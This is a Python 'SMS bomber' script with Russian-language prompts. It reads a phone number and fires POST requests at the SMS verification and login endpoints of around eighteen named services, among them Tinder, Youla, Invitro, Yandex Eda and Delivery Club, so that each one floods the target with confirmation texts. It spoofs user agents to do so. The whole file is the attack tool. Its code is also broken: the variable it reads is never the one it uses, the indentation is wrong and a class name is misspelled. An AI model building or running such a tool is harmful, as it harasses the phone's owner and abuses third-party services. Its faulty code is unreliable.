import requests, fake_useragent

user = fake_useragent.Useragent().random
headers = {'user_agent' : user}

NUMBER = input ('Введите номер телефона: ( Без +7 )')

    try:
        requests.post('https://belkacar.ru/get-confirmation-code', data={'phone': phone}, headers={})
        print('[+] BelkaCar отправлено!')
    except:
        print('[-] Не отправлено!')

    try:
        requests.post('https://api.gotinder.com/v2/auth/sms/send?auth_type=sms&locale=ru', data={'phone_number': phone}, headers={})
        print('[+] Tinder отправлено!')
    except:
        print('[-] Не отправлено!')

    try:
        requests.post('https://api.mtstv.ru/v1/users', json={'msisdn': phone}, headers={})
        print('[+] MTS отправлено!')
    except:
        print('[-] Не отправлено!')

    try:
        requests.post('https://youla.ru/web-api/auth/request_code', data={'phone': phone})
        print('[+] Youla отправлено!')
    except:
        print('[-] Не отправлено!')

    try:
        requests.post('https://www.rabota.ru/remind', data={'credential': phone})
        print('[+] Rabota отправлено!')
    except:
        print('[-] Не отправлено!')

    try:
        requests.post('https://api.sunlight.net/v3/customers/authorization/', data={'phone': phone})
        print('[+] Sunlight отправлено!')
    except:
        print('[-] Не отправлено!')

    try:
        requests.post('https://lk.invitro.ru/lk2/lka/patient/refreshCode', data={'phone': phone})
        print('[+] Invitro отправлено!')
    except:
        print('[-] Не отправлено!')

    try:
        requests.post('https://myapi.beltelecom.by/api/v1/auth/check-phone?lang=ru', data={'phone': phone})
        print('[+] Beltelcom отправлено!')
    except:
        print('[-] Не отправлено!')

    try:
        requests.post('https://ube.pmsm.org.ru/esb/iqos-phone/validate',json={'phone': phone})
        print('[+] Pmsm отправлено!')
    except:
        print('[-] Не отправлено!')

    try:
        requests.post('https://api.ivi.ru/mobileapi/user/register/phone/v6',data={'phone': phone})
        print('[+] IVI отправлено!')
    except:
        print('[-] Не отправлено!')

    try:
        requests.post('https://plink.tech/register/',json={'phone': phone})
        print('[+] Plink отправлено!')
    except:
        print('[-] Не отправлено!')

    try:
        requests.post('https://qlean.ru/clients-api/v2/sms_codes/auth/request_code',json={'phone': phone})
        print('[+] qlean отправлено!')
    except:
        print('[-] Не отправлено!')

    try:
        requests.post('http://smsgorod.ru/sendsms.php',data={'number': phone})
        print('[+] SMSgorod отправлено!')
    except:
        print('[-] Не отправлено!')

    try:
        requests.post('https://api.gotinder.com/v2/auth/sms/send?auth_type=sms&locale=ru',data={'phone_number': phone})
        print('[+] Tinder отправлено!')
    except:
        print('[-] Не отправлено!')


    try:
        requests.post('https://eda.yandex/api/v1/user/request_authentication_code',json={'phone_number': '+' + phone})
        print('[+] Eda.Yandex отправлено!')
    except:
        print('[-] Не отправлено!')

    try:
        requests.post('https://youla.ru/web-api/auth/request_code', data={'phone': phone})
        print('[+] Youla отправлено!')
    except:
        print('[-] Не отправлено!')

    try:
        requests.post('https://api-prime.anytime.global/api/v2/auth/sendVerificationCode',data={'phone': phone})
        print('[+] SMS отправлено!')
    except:
        print('[-] не отправлено!')
    try:
        requests.post('https://www.delivery-club.ru/ajax/user_otp', data={'phone': phone})
        print('[+] Delivery отправлено!')
    except:
        print('[-] Не отправлено!')




#requests.post('https://youla.ru/web-api/auth/request_code', data={'phone': _phone})
